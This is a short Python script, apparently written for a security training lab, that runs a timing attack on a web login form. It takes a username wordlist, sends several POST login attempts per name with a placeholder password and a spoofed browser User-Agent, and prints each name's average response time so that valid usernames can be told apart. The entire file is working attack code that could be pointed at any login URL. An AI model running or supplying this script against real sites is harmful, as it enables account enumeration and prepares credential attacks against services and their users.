import sys
import requests
import os.path
import argparse
import validators

# Instantiate the parser
parser = argparse.ArgumentParser(description='Simple brute-force timing attack to get valid username based on average-time after n login requests.')

# Required positional arguments
parser.add_argument('-w', '--wordlist', type=str, help='Wordlist file with the list of usernames.')
parser.add_argument('-u', '--url', type=str, help='Target URL with login form to attack.')

# Optional positional argument
# parser.add_argument('-n', 'nrounds', type=int, help='Number of rounds to iterate through (Default: 100).')

# Parse arguments
args = parser.parse_args()

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

rounds = 5

"""
wordlist is expected as simple list, we keep this function to have it ready if needed.
for this test we are using /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
change this function if your wordlist has a different format
"""
def unpack(fline):
    userid = fline
    passwd = 'foobar'

    return userid, passwd

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_average_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    total_time = 0
    average_time = 0

    for x in range(rounds):
        res = requests.post(url, headers=headers, data=data)
        total_time += res.elapsed.total_seconds()

    average_time = total_time / rounds
    print("[+] user {:15}; rounds {}; average time {}".format(userid, rounds, average_time))

    return average_time

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if args.wordlist and (len(args.wordlist) > 1) and (os.path.isfile(args.wordlist)):
        fname = args.wordlist
    else:
        print("[!] Please provide a wordlist.")
        print("[-] Usage: python3 {} -w /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    if args.url and (len(args.url) > 1) and validators.url(args.url):
        url = args.url
    else:
        print("[!] Please provide a valid URL.")
        print("[-] Usage: python3 {} -u http://target.url".format(sys.argv[0]))
        sys.exit()

    # open the file, this is our wordlist
    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            # skip line if it starts with a comment
            if fline.startswith("#"):
                continue
            # use unpack() function to extract userid and password from wordlist, removing trailing newline
            userid, passwd = unpack(fline.rstrip())

            # call do_req() to do the HTTP request
            # perform a number of rounds and get average time
            res = do_average_req(url, userid, passwd, headers)

if __name__ == "__main__":
    main()


